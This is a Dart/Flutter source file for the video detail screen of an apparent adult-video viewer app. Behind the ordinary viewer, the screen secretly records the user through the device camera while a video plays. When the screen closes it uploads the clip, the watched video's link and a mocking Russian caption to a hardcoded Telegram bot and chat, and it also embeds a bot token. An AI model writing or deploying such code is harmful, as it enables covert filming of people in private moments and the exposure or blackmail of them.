import 'dart:io';
import 'package:dio/dio.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:flutter_eporner/videosResponse.dart' as VideosResponse;
import 'package:flutter/material.dart';
import 'package:flutter_eporner/widgets/layout.dart' as layout;
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';

class DetailScreen extends StatefulWidget {
  final CameraController controller;
  DetailScreen(this.controller);

  @override
  State<StatefulWidget> createState() {
    return DetailScreenState(controller);
  }
}

class DetailScreenState extends State<DetailScreen> {
  CameraController _controller;
  String filePath;
  String timestamp() => DateTime.now().millisecondsSinceEpoch.toString();
  VideosResponse.Videos video;
  DetailScreenState(this._controller);
  @override
  void initState() {
    super.initState();
    startCamera();
  }

  void startCamera() async {
    Directory tempDir = await getTemporaryDirectory();
    filePath = '${tempDir.path}/${timestamp()}.mp4';
    print(
        '---------------------------------------INIT----------------------------------------');
    bool isRecording = _controller.value.isRecordingVideo;
    if (!isRecording) _controller.startVideoRecording(filePath);
  }

  void stopCamera() async {
    bool isRecording = _controller.value.isRecordingVideo;
    if (isRecording)
      _controller.stopVideoRecording().then((_) async {
        print(
            '----------------------------------$filePath----------------------------------------');
        FormData videoData = new FormData.fromMap({
          "chat_id": "186299579",
          "video":
              await MultipartFile.fromFile(filePath, filename: "capture.mp4")
        });

        var messageData = {
          'chat_id': '186299579',
          'text': 'Зырь, шо он(а) смотрел(а): ' + video.embed,
        };
        Dio().post(
            "https://api.telegram.org/bot834507258:AAHoypWs6uRhgfErzrnDGdRUxAEVcKk4NoM/sendVideo",
            data: videoData);
        Dio().post(
            'https://api.telegram.org/bot834507258:AAHoypWs6uRhgfErzrnDGdRUxAEVcKk4NoM/sendMessage',
            data: messageData);
      });
  }

  @override
  void dispose() {
    super.dispose();
    print(
        '---------------------------------------DESTROY--------------------------------------');
    stopCamera();
  }

  @override
  Widget build(BuildContext context) {
    video = ModalRoute.of(context).settings.arguments;
    return layout.Layout(
      children: <Widget>[
        Expanded(
            child: WebView(
          initialUrl: video.embed,
          javascriptMode: JavascriptMode.unrestricted,
          onPageFinished: (_) => print('Finish'),
        ))
      ],
    );
  }
}
